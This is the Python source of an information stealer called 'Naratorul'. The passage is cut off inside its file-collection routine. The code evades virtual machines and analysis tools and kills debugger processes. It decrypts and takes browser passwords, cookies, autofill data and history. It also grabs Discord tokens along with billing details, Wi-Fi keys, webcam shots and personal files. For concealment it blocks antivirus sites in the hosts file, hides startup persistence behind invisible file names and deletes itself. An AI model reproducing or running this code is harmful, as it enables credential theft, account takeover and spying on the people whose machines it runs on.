import sys
import os
import time
import random
import json
import base64
import zlib
import subprocess
import shutil
import sqlite3
import re
import traceback
import ctypes
import ctypes.wintypes
from threading import Thread
from urllib3 import PoolManager, disable_warnings
disable_warnings()

class Settings:
    C2 = (0, base64.b64decode('').decode())
    Mutex = base64.b64decode('').decode()
    PingMe = bool('')
    Vmprotect = bool('')
    Startup = bool('')
    Melt = bool('')
    UacBypass = bool('')
    ArchivePassword = base64.b64decode('YmxhbmsxMjM=').decode()
    HideConsole = bool('true')
    Debug = bool('')
    RunBoundOnStartup = bool('')
    CaptureWebcam = bool('true')
    CapturePasswords = bool('true')
    CaptureCookies = bool('true')
    CaptureAutofills = bool('true')
    CaptureHistory = bool('true')
    CaptureDiscordTokens = bool('true')
    CaptureGames = bool('true')
    CaptureWifiPasswords = bool('true')
    CaptureSystemInfo = bool('true')
    CaptureScreenshot = bool('true')
    CaptureCommonFiles = bool('true')
    CaptureWallets = bool('true')
    FakeError = (bool(''), ('', '', '0'))
    BlockAvSites = bool('')
    DiscordInjection = bool('')

if not hasattr(sys, '_MEIPASS'):
    sys._MEIPASS = os.path.dirname(os.path.abspath(__file__))

class VmProtect:
    BLACKLISTED_UUIDS = ('7AB5C494-39F5-4941-9163-47F54D6D5016', '032E02B4-0499-05C3-0806-3C0700080009',
                         '03DE0294-0480-05DE-1A06-350700080009', '11111111-2222-3333-4444-555555555555',
                         '6F3CA5EC-BEC9-4A4D-8274-11168F640058', 'ADEEEE9E-EF0A-6B84-B14B-B83A54AFC548',
                         '4C4C4544-0050-3710-8058-CAC04F59344A', '00000000-0000-0000-0000-AC1F6BD04972',
                         '00000000-0000-0000-0000-000000000000', '5BD24D56-789F-8468-7CDC-CAA7222CC121',
                         '49434D53-0200-9065-2500-65902500E439', '49434D53-0200-9036-2500-36902500F022',
                         '777D84B3-88D1-451C-93E4-D235177420A7', '49434D53-0200-9036-2500-369025000C65',
                         'B1112042-52E8-E25B-3655-6A4F54155DBF', '00000000-0000-0000-0000-AC1F6BD048FE',
                         'EB16924B-FB6D-4FA1-8666-17B91F62FB37', 'A15A930C-8251-9645-AF63-E45AD728C20C',
                         '67E595EB-54AC-4FF0-B5E3-3DA7C7B547E3', 'C7D23342-A5D4-68A1-59AC-CF40F735B363',
                         '63203342-0EB0-AA1A-4DF5-3FB37DBB0670', '44B94D56-65AB-DC02-86A0-98143A7423BF',
                         '6608003F-ECE4-494E-B07E-1C4615D1D93C', 'D9142042-8F51-5EFF-D5F8-EE9AE3D1602A',
                         '49434D53-0200-9036-2500-369025003AF0', '8B4E8278-525C-7343-B825-280AEBCD3BCB',
                         '4D4DDC94-E06C-44F4-95FE-33A1ADA5AC27', '79AF5279-16CF-4094-9758-F88A616D81B4',
                         'FE822042-A70C-D08B-F1D1-C207055A488F', '76122042-C286-FA81-F0A8-514CC507B250',
                         '481E2042-A1AF-D390-CE06-A8F783B1E76A', 'F3988356-32F5-4AE1-8D47-FD3B8BAFBD4C',
                         '9961A120-E691-4FFE-B67B-F0E4115D5919')
    BLACKLISTED_COMPUTERNAMES = ('bee7370c-8c0c-4', 'desktop-nakffmt', 'win-5e07cos9alr', 'b30f0242-1c6a-4',
                                 'desktop-vrsqlag', 'q9iatrkprh', 'xc64zb', 'desktop-d019gdm', 'desktop-wi8clet',
                                 'server1', 'lisa-pc', 'john-pc', 'desktop-b0t93d6', 'desktop-1pykp29',
                                 'desktop-1y2433r', 'wileypc', 'work', '6c4e733f-c2d9-4', 'ralphs-pc',
                                 'desktop-wg3myjs', 'desktop-7xc6gez', 'desktop-5ov9s0o', 'qarzhrdbpj',
                                 'oreleepc', 'archibaldpc', 'julia-pc', 'd1bnjkfvlh', 'compname_5076',
                                 'desktop-vkeons4', 'NTT-EFF-2W11WSS')
    BLACKLISTED_USERS = ('wdagutilityaccount', 'abby', 'peter wilson', 'hmarc', 'patex', 'john-pc',
                         'rdhj0cnfevzx', 'keecfmwgj', 'frank', '8nl0colnq5bq', 'lisa', 'john', 'george',
                         'pxmduopvyx', '8vizsm', 'w0fjuovmccp5a', 'lmvwjj9b', 'pqonjhvwexss', '3u2v9m8',
                         'julia', 'heuerzl', 'harry johnson', 'j.seance', 'a.monaldo', 'tvm')
    BLACKLISTED_TASKS = ('fakenet', 'dumpcap', 'httpdebuggerui', 'wireshark', 'fiddler', 'vboxservice',
                         'df5serv', 'vboxtray', 'vmtoolsd', 'vmwaretray', 'ida64', 'ollydbg', 'pestudio',
                         'vmwareuser', 'vgauthservice', 'vmacthlp', 'x96dbg', 'vmsrvc', 'x32dbg',
                         'vmusrvc', 'prl_cc', 'prl_tools', 'xenservice', 'qemu-ga', 'joeboxcontrol',
                         'ksdumperclient', 'ksdumper', 'joeboxserver', 'vmwareservice', 'vmwaretray',
                         'discordtokenprotector')

    @staticmethod
    def checkUUID():
        try:
            uuid = subprocess.run('wmic csproduct get uuid', shell=True, capture_output=True).stdout.splitlines()[2].decode(errors='ignore').strip()
            return uuid in VmProtect.BLACKLISTED_UUIDS
        except:
            return False

    @staticmethod
    def checkComputerName():
        computername = os.getenv('computername')
        return computername and computername.lower() in VmProtect.BLACKLISTED_COMPUTERNAMES

    @staticmethod
    def checkUsers():
        try:
            user = os.getlogin()
            return user.lower() in VmProtect.BLACKLISTED_USERS
        except:
            return False

    @staticmethod
    def checkHosting():
        try:
            http = PoolManager(cert_reqs='CERT_NONE')
            return http.request('GET', 'http://ip-api.com/line/?fields=hosting').data.decode(errors='ignore').strip() == 'true'
        except:
            return False

    @staticmethod
    def checkHTTPSimulation():
        try:
            http = PoolManager(cert_reqs='CERT_NONE', timeout=1.0)
            http.request('GET', 'https://naratorul-' + Utility.GetRandomString() + '.in')
            return True
        except:
            return False

    @staticmethod
    def checkRegistry():
        try:
            r1 = subprocess.run('REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\DriverDesc 2', capture_output=True, shell=True)
            r2 = subprocess.run('REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\ProviderName 2', capture_output=True, shell=True)
            gpucheck = any(x.lower() in subprocess.run('wmic path win32_VideoController get name', capture_output=True, shell=True).stdout.decode(errors='ignore').splitlines()[2].strip().lower() for x in ('virtualbox', 'vmware'))
            dircheck = any(os.path.isdir(path) for path in ('D:\\Tools', 'D:\\OS2', 'D:\\NT3X'))
            return (r1.returncode != 1 and r2.returncode != 1) or gpucheck or dircheck
        except:
            return False

    @staticmethod
    def killTasks():
        Utility.TaskKill(*VmProtect.BLACKLISTED_TASKS)

    @staticmethod
    def isVM():
        return False

class Errors:
    errors = []
    @staticmethod
    def Catch(func):
        def newFunc(*args, **kwargs):
            try:
                return func(*args, **kwargs)
            except:
                pass
        return newFunc

class Tasks:
    threads = []
    @staticmethod
    def AddTask(task):
        Tasks.threads.append(task)
    @staticmethod
    def WaitForAll():
        for thread in Tasks.threads:
            thread.join()

class Syscalls:
    @staticmethod
    def CaptureWebcam(index, filePath):
        try:
            avicap32 = ctypes.windll.avicap32
            WS_CHILD = 1073741824
            WM_CAP_DRIVER_CONNECT = 1024 + 10
            WM_CAP_DRIVER_DISCONNECT = 1026
            WM_CAP_FILE_SAVEDIB = 1024 + 100 + 25
            hcam = avicap32.capCreateCaptureWindowW(ctypes.wintypes.LPWSTR('Naratorul'), WS_CHILD, 0, 0, 0, 0,
                                                    ctypes.windll.user32.GetDesktopWindow(), 0)
            if hcam:
                if ctypes.windll.user32.SendMessageA(hcam, WM_CAP_DRIVER_CONNECT, index, 0):
                    if ctypes.windll.user32.SendMessageA(hcam, WM_CAP_FILE_SAVEDIB, 0,
                                                          ctypes.wintypes.LPWSTR(filePath)):
                        result = True
                    else:
                        result = False
                    ctypes.windll.user32.SendMessageA(hcam, WM_CAP_DRIVER_DISCONNECT, 0, 0)
                else:
                    result = False
                ctypes.windll.user32.DestroyWindow(hcam)
            else:
                result = False
            return result
        except:
            return False

    @staticmethod
    def CreateMutex(mutex):
        kernel32 = ctypes.windll.kernel32
        mutex_handle = kernel32.CreateMutexA(None, False, mutex)
        return kernel32.GetLastError() != 183

    @staticmethod
    def CryptUnprotectData(encrypted_data, optional_entropy=None):
        class DATA_BLOB(ctypes.Structure):
            _fields_ = [('cbData', ctypes.c_ulong), ('pbData', ctypes.POINTER(ctypes.c_ubyte))]
        pDataIn = DATA_BLOB(len(encrypted_data), ctypes.cast(encrypted_data, ctypes.POINTER(ctypes.c_ubyte)))
        pDataOut = DATA_BLOB()
        pOptionalEntropy = None
        if optional_entropy is not None:
            optional_entropy = optional_entropy.encode('utf-16')
            pOptionalEntropy = DATA_BLOB(len(optional_entropy), ctypes.cast(optional_entropy, ctypes.POINTER(ctypes.c_ubyte)))
        if ctypes.windll.Crypt32.CryptUnprotectData(ctypes.byref(pDataIn), None,
                                                    ctypes.byref(pOptionalEntropy) if pOptionalEntropy else None,
                                                    None, None, 0, ctypes.byref(pDataOut)):
            data = (ctypes.c_ubyte * pDataOut.cbData)()
            ctypes.memmove(data, pDataOut.pbData, pDataOut.cbData)
            ctypes.windll.Kernel32.LocalFree(pDataOut.pbData)
            return bytes(data)
        raise ValueError('CryptUnprotectData failed')

    @staticmethod
    def HideConsole():
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

class Utility:
    @staticmethod
    def GetSelf():
        if hasattr(sys, 'frozen'):
            return (sys.executable, True)
        else:
            return (__file__, False)

    @staticmethod
    def TaskKill(*tasks):
        tasks = [x.lower() for x in tasks]
        out = subprocess.run('tasklist /FO LIST', shell=True, capture_output=True).stdout.decode(errors='ignore').strip().split('\r\n\r\n')
        for i in out:
            i = i.split('\r\n')[:2]
            try:
                name = i[0].split()[-1]
                pid = int(i[1].split()[-1])
                name = name[:-4] if name.endswith('.exe') else name
                if name.lower() in tasks:
                    subprocess.run('taskkill /F /PID %d' % pid, shell=True, capture_output=True)
            except:
                pass

    @staticmethod
    def UACPrompt(path):
        return ctypes.windll.shell32.ShellExecuteW(None, 'runas', path, ' '.join(sys.argv), None, 1) == 42

    @staticmethod
    def DisableDefender():
        pass

    @staticmethod
    def ExcludeFromDefender(path=None):
        pass

    @staticmethod
    def GetRandomString(length=5, invisible=False):
        if invisible:
            return ''.join(random.choices(['\xa0', chr(8239)] + [chr(x) for x in range(8192, 8208)], k=length))
        else:
            return ''.join(random.choices('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=length))

    @staticmethod
    def GetWifiPasswords():
        profiles = []
        passwords = {}
        try:
            out = subprocess.run('netsh wlan show profile', shell=True, capture_output=True).stdout.decode(errors='ignore').strip()
            for line in out.splitlines():
                if 'All User Profile' in line:
                    name = line[line.find(':') + 1:].strip()
                    profiles.append(name)
            for profile in profiles:
                out = subprocess.run('netsh wlan show profile "%s" key=clear' % profile, shell=True, capture_output=True).stdout.decode(errors='ignore').strip()
                found = False
                for line in out.splitlines():
                    if 'Key Content' in line:
                        passwords[profile] = line[line.find(':') + 1:].strip()
                        found = True
                        break
                if not found:
                    passwords[profile] = '(None)'
        except:
            pass
        return passwords

    @staticmethod
    def GetLnkTarget(path_to_lnk):
        if not os.path.isfile(path_to_lnk):
            return None
        try:
            abs_path = os.path.abspath(path_to_lnk).replace("\\", "\\\\")
            cmd = 'wmic path win32_shortcutfile where name="%s" get target /value' % abs_path
            out = subprocess.run(cmd, shell=True, capture_output=True).stdout.decode(errors='ignore')
            for line in out.splitlines():
                if line.startswith('Target='):
                    target = line.lstrip('Target=').strip()
                    if os.path.exists(target):
                        return target
        except:
            pass
        return None

    @staticmethod
    def GetLnkFromStartMenu(app):
        shortcutPaths = []
        startMenuPaths = [os.path.join(os.environ['APPDATA'], 'Microsoft', 'Windows', 'Start Menu', 'Programs'),
                          os.path.join('C:\\', 'ProgramData', 'Microsoft', 'Windows', 'Start Menu', 'Programs')]
        for startMenuPath in startMenuPaths:
            if not os.path.isdir(startMenuPath):
                continue
            for root, _, files in os.walk(startMenuPath):
                for file in files:
                    if file.lower() == app.lower() + '.lnk':
                        shortcutPaths.append(os.path.join(root, file))
        return shortcutPaths

    @staticmethod
    def IsAdmin():
        return ctypes.windll.shell32.IsUserAnAdmin() == 1

    @staticmethod
    def UACbypass(method=1):
        return False

    @staticmethod
    def IsInStartup():
        path = os.path.dirname(Utility.GetSelf()[0])
        return os.path.basename(path).lower() == 'startup'

    @staticmethod
    def PutInStartup():
        STARTUPDIR = 'C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp'
        file, isExecutable = Utility.GetSelf()
        if isExecutable:
            out = os.path.join(STARTUPDIR, Utility.GetRandomString(invisible=True) + '.scr')
            os.makedirs(STARTUPDIR, exist_ok=True)
            try:
                shutil.copy(file, out)
                return out
            except:
                pass
        return None

    @staticmethod
    def IsConnectedToInternet():
        try:
            http = PoolManager(cert_reqs='CERT_NONE')
            return http.request('GET', 'https://gstatic.com/generate_204').status == 204
        except:
            return False

    @staticmethod
    def DeleteSelf():
        path, isExecutable = Utility.GetSelf()
        if isExecutable:
            subprocess.Popen('ping localhost -n 3 > NUL && del /A H /F "%s"' % path, shell=True, creationflags=subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE)
            os._exit(0)
        else:
            os.remove(path)

    @staticmethod
    def HideSelf():
        path, _ = Utility.GetSelf()
        subprocess.Popen('attrib +h +s "%s"' % path, shell=True, creationflags=subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE)

    @staticmethod
    def BlockSites():
        if not Utility.IsAdmin():
            return
        try:
            call = subprocess.run('REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters /V DataBasePath', capture_output=True, shell=True)
            if call.returncode != 0:
                hostdirpath = os.path.join('System32', 'drivers', 'etc')
            else:
                hostdirpath = os.sep.join(call.stdout.decode(errors='ignore').strip().splitlines()[-1].split()[-1].split(os.sep)[1:])
            hostfilepath = os.path.join(os.getenv('systemroot'), hostdirpath, 'hosts')
            if not os.path.isfile(hostfilepath):
                return
            with open(hostfilepath) as f:
                data = f.readlines()
            BANNED_SITES = ('virustotal.com', 'avast.com', 'totalav.com', 'scanguard.com', 'totaladblock.com',
                            'pcprotect.com', 'mcafee.com', 'bitdefender.com', 'us.norton.com', 'avg.com',
                            'malwarebytes.com', 'pandasecurity.com', 'avira.com', 'norton.com', 'eset.com',
                            'zillya.com', 'kaspersky.com', 'usa.kaspersky.com', 'sophos.com', 'home.sophos.com',
                            'adaware.com', 'bullguard.com', 'clamav.net', 'drweb.com', 'emsisoft.com',
                            'f-secure.com', 'zonealarm.com', 'trendmicro.com', 'ccleaner.com')
            newdata = []
            for line in data:
                if any(x in line for x in BANNED_SITES):
                    continue
                newdata.append(line)
            for site in BANNED_SITES:
                newdata.append('\t0.0.0.0 %s' % site)
                newdata.append('\t0.0.0.0 www.%s' % site)
            newdata = '\n'.join(newdata).replace('\n\n', '\n')
            subprocess.run('attrib -r %s' % hostfilepath, shell=True, capture_output=True)
            with open(hostfilepath, 'w') as f:
                f.write(newdata)
            subprocess.run('attrib +r %s' % hostfilepath, shell=True, capture_output=True)
        except:
            pass

class Browsers:
    class Chromium:
        def __init__(self, browserPath):
            if not os.path.isdir(browserPath):
                raise NotADirectoryError('Browser path not found')
            self.BrowserPath = browserPath
            self.EncryptionKey = None

        def GetEncryptionKey(self):
            if self.EncryptionKey:
                return self.EncryptionKey
            localStatePath = os.path.join(self.BrowserPath, 'Local State')
            if not os.path.isfile(localStatePath):
                return None
            try:
                with open(localStatePath, encoding='utf-8', errors='ignore') as f:
                    jsonContent = json.load(f)
                encryptedKey = jsonContent['os_crypt']['encrypted_key']
                encryptedKey = base64.b64decode(encryptedKey)[5:]
                self.EncryptionKey = Syscalls.CryptUnprotectData(encryptedKey)
                return self.EncryptionKey
            except:
                return None

        def Decrypt(self, buffer, key):
            try:
                version = buffer.decode(errors='ignore')
                if version.startswith(('v10', 'v11')):
                    iv = buffer[3:15]
                    cipherText = buffer[15:]
                    import pyaes
                    return pyaes.AESModeOfOperationGCM(key, iv).decrypt(cipherText)[:-16].decode(errors='ignore')
                else:
                    return str(Syscalls.CryptUnprotectData(buffer))
            except:
                return ''

        def GetPasswords(self):
            key = self.GetEncryptionKey()
            if not key:
                return []
            passwords = []
            loginPaths = []
            for root, _, files in os.walk(self.BrowserPath):
                for file in files:
                    if file.lower() == 'login data':
                        loginPaths.append(os.path.join(root, file))
            for path in loginPaths:
                tempfile = None
                try:
                    while True:
                        tempfile = os.path.join(os.getenv('temp'), Utility.GetRandomString(10) + '.tmp')
                        if not os.path.isfile(tempfile):
                            break
                    shutil.copy(path, tempfile)
                    db = sqlite3.connect(tempfile)
                    db.text_factory = lambda b: b.decode(errors='ignore')
                    cur = db.cursor()
                    rows = cur.execute('SELECT origin_url, username_value, password_value FROM logins').fetchall()
                    for url, username, password in rows:
                        if url and username and password:
                            dec = self.Decrypt(password, key)
                            if dec:
                                passwords.append((url, username, dec))
                    cur.close()
                    db.close()
                    os.remove(tempfile)
                except:
                    if tempfile and os.path.isfile(tempfile):
                        try:
                            os.remove(tempfile)
                        except:
                            pass
            return passwords

        def GetCookies(self):
            key = self.GetEncryptionKey()
            if not key:
                return []
            cookies = []
            cookiePaths = []
            for root, _, files in os.walk(self.BrowserPath):
                for file in files:
                    if file.lower() == 'cookies':
                        cookiePaths.append(os.path.join(root, file))
            for path in cookiePaths:
                tempfile = None
                try:
                    while True:
                        tempfile = os.path.join(os.getenv('temp'), Utility.GetRandomString(10) + '.tmp')
                        if not os.path.isfile(tempfile):
                            break
                    shutil.copy(path, tempfile)
                    db = sqlite3.connect(tempfile)
                    db.text_factory = lambda b: b.decode(errors='ignore')
                    cur = db.cursor()
                    rows = cur.execute('SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies').fetchall()
                    for host, name, path, cookie, expiry in rows:
                        if host and name and cookie:
                            dec = self.Decrypt(cookie, key)
                            if dec:
                                cookies.append((host, name, path, dec, expiry))
                    cur.close()
                    db.close()
                    os.remove(tempfile)
                except:
                    if tempfile and os.path.isfile(tempfile):
                        try:
                            os.remove(tempfile)
                        except:
                            pass
            return cookies

        def GetHistory(self):
            history = []
            historyPaths = []
            for root, _, files in os.walk(self.BrowserPath):
                for file in files:
                    if file.lower() == 'history':
                        historyPaths.append(os.path.join(root, file))
            for path in historyPaths:
                tempfile = None
                try:
                    while True:
                        tempfile = os.path.join(os.getenv('temp'), Utility.GetRandomString(10) + '.tmp')
                        if not os.path.isfile(tempfile):
                            break
                    shutil.copy(path, tempfile)
                    db = sqlite3.connect(tempfile)
                    db.text_factory = lambda b: b.decode(errors='ignore')
                    cur = db.cursor()
                    rows = cur.execute('SELECT url, title, visit_count, last_visit_time FROM urls').fetchall()
                    for url, title, vc, lvt in rows:
                        if url and title and vc is not None and lvt is not None:
                            history.append((url, title, vc, lvt))
                    cur.close()
                    db.close()
                    os.remove(tempfile)
                except:
                    if tempfile and os.path.isfile(tempfile):
                        try:
                            os.remove(tempfile)
                        except:
                            pass
            history.sort(key=lambda x: x[3], reverse=True)
            return [(x[0], x[1], x[2]) for x in history]

        def GetAutofills(self):
            autofills = []
            autofillPaths = []
            for root, _, files in os.walk(self.BrowserPath):
                for file in files:
                    if file.lower() == 'web data':
                        autofillPaths.append(os.path.join(root, file))
            for path in autofillPaths:
                tempfile = None
                try:
                    while True:
                        tempfile = os.path.join(os.getenv('temp'), Utility.GetRandomString(10) + '.tmp')
                        if not os.path.isfile(tempfile):
                            break
                    shutil.copy(path, tempfile)
                    db = sqlite3.connect(tempfile)
                    db.text_factory = lambda b: b.decode(errors='ignore')
                    cur = db.cursor()
                    rows = cur.execute('SELECT value FROM autofill').fetchall()
                    for row in rows:
                        val = row[0].strip()
                        if val and val not in autofills:
                            autofills.append(val)
                    cur.close()
                    db.close()
                    os.remove(tempfile)
                except:
                    if tempfile and os.path.isfile(tempfile):
                        try:
                            os.remove(tempfile)
                        except:
                            pass
            return autofills

class Discord:
    httpClient = PoolManager(cert_reqs='CERT_NONE')
    ROAMING = os.getenv('appdata')
    LOCALAPPDATA = os.getenv('localappdata')
    REGEX = '[\\w-]{24,26}\\.[\\w-]{6}\\.[\\w-]{25,110}'
    REGEX_ENC = 'dQw4w9WgXcQ:[^.*\\[\'(.*)\'\\].*$][^\\"]*'

    @staticmethod
    def GetHeaders(token=None):
        headers = {'content-type': 'application/json', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
        if token:
            headers['authorization'] = token
        return headers

    @staticmethod
    def GetTokens():
        results = []
        tokens = []
        threads = []
        paths = {
            'Discord': os.path.join(Discord.ROAMING, 'discord'),
            'Discord Canary': os.path.join(Discord.ROAMING, 'discordcanary'),
            'Lightcord': os.path.join(Discord.ROAMING, 'Lightcord'),
            'Discord PTB': os.path.join(Discord.ROAMING, 'discordptb'),
            'Opera': os.path.join(Discord.ROAMING, 'Opera Software', 'Opera Stable'),
            'Opera GX': os.path.join(Discord.ROAMING, 'Opera Software', 'Opera GX Stable'),
            'Chrome': os.path.join(Discord.LOCALAPPDATA, 'Google', 'Chrome', 'User Data'),
            'Brave': os.path.join(Discord.LOCALAPPDATA, 'BraveSoftware', 'Brave-Browser', 'User Data'),
            'Edge': os.path.join(Discord.LOCALAPPDATA, 'Microsoft', 'Edge', 'User Data'),
            'FireFox': os.path.join(Discord.ROAMING, 'Mozilla', 'Firefox', 'Profiles')
        }
        for name, path in paths.items():
            if os.path.isdir(path):
                if name == 'FireFox':
                    t = Thread(target=lambda: tokens.extend(Discord.FireFoxSteal(path) or []))
                else:
                    t = Thread(target=lambda: tokens.extend(Discord.SimpleSteal(path) or []))
                    t2 = Thread(target=lambda: tokens.extend(Discord.SafeStorageSteal(path) or []))
                    t.start()
                    threads.append(t)
                    t2.start()
                    threads.append(t2)
                    continue
                t.start()
                threads.append(t)
        for t in threads:
            t.join()
        tokens = list(set(tokens))
        for token in tokens:
            try:
                r = Discord.httpClient.request('GET', 'https://discord.com/api/v9/users/@me', headers=Discord.GetHeaders(token.strip()))
                if r.status != 200:
                    continue
                data = json.loads(r.data.decode(errors='ignore'))
                user = data['username'] + '#' + str(data['discriminator'])
                userid = data['id']
                email = data.get('email', '(No Email)') or '(No Email)'
                phone = data.get('phone', '(No Phone)') or '(No Phone)'
                verified = data.get('verified', False)
                mfa = data.get('mfa_enabled', False)
                nitro_type = data.get('premium_type', 0)
                nitro_map = {0: 'No Nitro', 1: 'Nitro Classic', 2: 'Nitro', 3: 'Nitro Basic'}
                nitro = nitro_map.get(nitro_type, 'Unknown')
                try:
                    billing_resp = Discord.httpClient.request('GET', 'https://discordapp.com/api/v9/users/@me/billing/payment-sources', headers=Discord.GetHeaders(token))
                    billing_data = json.loads(billing_resp.data.decode(errors='ignore'))
                    if billing_data:
                        methods = {'Card': 0, 'Paypal': 0, 'Unknown': 0}
                        for m in billing_data:
                            if isinstance(m, dict):
                                t = m.get('type', 0)
                                if t == 1:
                                    methods['Card'] += 1
                                elif t == 2:
                                    methods['Paypal'] += 1
                                else:
                                    methods['Unknown'] += 1
                        billing = ', '.join([f"{k} ({v})" for k, v in methods.items() if v > 0]) or 'None'
                    else:
                        billing = 'No Payment Method'
                except:
                    billing = 'Unable to retrieve'
                try:
                    gifts_resp = Discord.httpClient.request('GET', 'https://discord.com/api/v9/users/@me/outbound-promotions/codes', headers=Discord.GetHeaders(token))
                    gifts_data = json.loads(gifts_resp.data.decode(errors='ignore'))
                    gifts = []
                    if 'code' in gifts_data:
                        for item in gifts_data:
                            if isinstance(item, dict):
                                code = item.get('code')
                                promo = item.get('promotion')
                                if promo and isinstance(promo, dict):
                                    title = promo.get('outbound_title')
                                    if code and title:
                                        gifts.append(f"{title}: {code}")
                    if not gifts:
                        gifts_text = 'Gift Codes: (NONE)'
                    else:
                        gifts_text = 'Gift Codes:\n\t' + '\n\t'.join(gifts)
                except:
                    gifts_text = 'Gift Codes: (Error)'
                results.append({
                    'USERNAME': user,
                    'USERID': userid,
                    'EMAIL': email,
                    'PHONE': phone,
                    'VERIFIED': verified,
                    'MFA': mfa,
                    'NITRO': nitro,
                    'BILLING': billing,
                    'TOKEN': token,
                    'GIFTS': gifts_text
                })
            except:
                pass
        return results

    @staticmethod
    def SafeStorageSteal(path):
        encryptedTokens = []
        tokens = []
        key = None
        localStatePath = os.path.join(path, 'Local State')
        levelDbPaths = []
        for root, dirs, _ in os.walk(path):
            for d in dirs:
                if d == 'leveldb':
                    levelDbPaths.append(os.path.join(root, d))
        if os.path.isfile(localStatePath) and levelDbPaths:
            try:
                with open(localStatePath, errors='ignore') as f:
                    jsonContent = json.load(f)
                key = jsonContent['os_crypt']['encrypted_key']
                key = base64.b64decode(key)[5:]
                for levelDbPath in levelDbPaths:
                    for file in os.listdir(levelDbPath):
                        if file.endswith(('.log', '.ldb')):
                            with open(os.path.join(levelDbPath, file), errors='ignore') as f:
                                lines = f.readlines()
                            for line in lines:
                                matches = re.findall(Discord.REGEX_ENC, line)
                                for match in matches:
                                    match = match.rstrip('\\')
                                    if match not in encryptedTokens:
                                        try:
                                            enc = base64.b64decode(match.split('dQw4w9WgXcQ:')[1].encode())
                                            encryptedTokens.append(enc)
                                        except:
                                            pass
            except:
                pass
        for enc in encryptedTokens:
            try:
                dec = pyaes.AESModeOfOperationGCM(Syscalls.CryptUnprotectData(key), enc[3:15]).decrypt(enc[15:])[:-16].decode(errors='ignore')
                if dec:
                    tokens.append(dec)
            except:
                pass
        return tokens

    @staticmethod
    def SimpleSteal(path):
        tokens = []
        levelDbPaths = []
        for root, dirs, _ in os.walk(path):
            for d in dirs:
                if d == 'leveldb':
                    levelDbPaths.append(os.path.join(root, d))
        for levelDbPath in levelDbPaths:
            for file in os.listdir(levelDbPath):
                if file.endswith(('.log', '.ldb')):
                    with open(os.path.join(levelDbPath, file), errors='ignore') as f:
                        lines = f.readlines()
                    for line in lines:
                        matches = re.findall(Discord.REGEX, line.strip())
                        for match in matches:
                            match = match.rstrip('\\')
                            if match not in tokens:
                                tokens.append(match)
        return tokens

    @staticmethod
    def FireFoxSteal(path):
        tokens = []
        for root, _, files in os.walk(path):
            for file in files:
                if file.lower().endswith('.sqlite'):
                    try:
                        with open(os.path.join(root, file), errors='ignore') as f:
                            lines = f.readlines()
                        for line in lines:
                            matches = re.findall(Discord.REGEX, line)
                            for match in matches:
                                match = match.rstrip('\\')
                                if match not in tokens:
                                    tokens.append(match)
                    except:
                        pass
        return tokens

    @staticmethod
    def InjectJs():
        return

class Naratorul:
    def __init__(self):
        self.Separator = '\n\n' + 'Naratorul'.center(50, '=') + '\n\n'
        self.ArchivePath = None
        self.TempFolder = None
        self.Cookies = []
        self.PasswordsCount = 0
        self.HistoryCount = 0
        self.AutofillCount = 0
        self.RobloxCookiesCount = 0
        self.DiscordTokensCount = 0
        self.WifiPasswordsCount = 0
        self.MinecraftSessions = 0
        self.WebcamPicturesCount = 0
        self.TelegramSessionsCount = 0
        self.CommonFilesCount = 0
        self.WalletsCount = 0
        self.ScreenshotTaken = False
        self.SystemInfoStolen = False
        self.SteamStolen = False
        self.EpicStolen = False
        self.UplayStolen = False
        self.GrowtopiaStolen = False

        while True:
            self.ArchivePath = os.path.join(os.getenv('temp'), Utility.GetRandomString() + '.zip')
            if not os.path.isfile(self.ArchivePath):
                break
        while True:
            self.TempFolder = os.path.join(os.getenv('temp'), Utility.GetRandomString(10, True))
            if not os.path.isdir(self.TempFolder):
                os.makedirs(self.TempFolder, exist_ok=True)
                break

        tasks = [
            (self.StealBrowserData, False),
            (self.StealDiscordTokens, False),
            (self.StealWallets, False),
            (self.StealMinecraft, False),
            (self.StealEpic, False),
            (self.StealGrowtopia, False),
            (self.StealSteam, False),
            (self.StealUplay, False),
            (self.GetAntivirus, False),
            (self.GetClipboard, False),
            (self.GetTaskList, False),
            (self.GetDirectoryTree, False),
            (self.GetWifiPasswords, False),
            (self.StealSystemInfo, False),
            (self.BlockSites, False),
            (self.TakeScreenshot, True),
            (self.Webshot, True),
            (self.StealCommonFiles, True)
        ]
        for func, daemon in tasks:
            t = Thread(target=func, daemon=daemon)
            t.start()
            Tasks.AddTask(t)

        Tasks.WaitForAll()

        if Errors.errors:
            with open(os.path.join(self.TempFolder, 'Errors.txt'), 'w', encoding='utf-8', errors='ignore') as f:
                f.write('# Errors encountered\n\n' + '\n\n'.join(Errors.errors))

        self.SendData()

        try:
            os.remove(self.ArchivePath)
            shutil.rmtree(self.TempFolder)
        except:
            pass

    @Errors.Catch
    def StealCommonFiles(self):
        if not Settings.CaptureCommonFiles:
            return
        for name, dir in (('Desktop', os.path.join(os.getenv('userprofile'), 'Desktop')),
                          ('Pictures', os.path.join(os.getenv('userprofile'), 'Pictures')),
                          ('Documents', os.path.join(os.getenv('userprofile'), 'Documents')),
                          ('Music', os.path.join(os.getenv('userprofile'), 'Music')),
                          ('Videos', os.path.join(os.getenv('userprofile'), 'Videos')),
                          ('Downloads', os.path.join(os.getenv('userprofile'), 'Downloads'))):
            if not os.path.isdir(dir):
                continue
            for file in os.listdir(dir):
                filepath = os.path.join(dir, file)
                if not os.path.isfile(filepath):
                    continue
                if (any(x in file.lower() for x in ('secret','password','account','tax','key','wallet','backup')) or
                    file.lower().endswith(('.txt','.doc','.docx','.png','.pdf','.jpg','.jpeg','.csv','.mp3','.mp4','.xls','.xlsx'))):
                    if os.path.getsize(filepath) < 2 * 1024 * 1024:
                        try:
                            os.makedirs(os.path.join(self.TempFolder, 'Common Files', name), exist_ok=True)
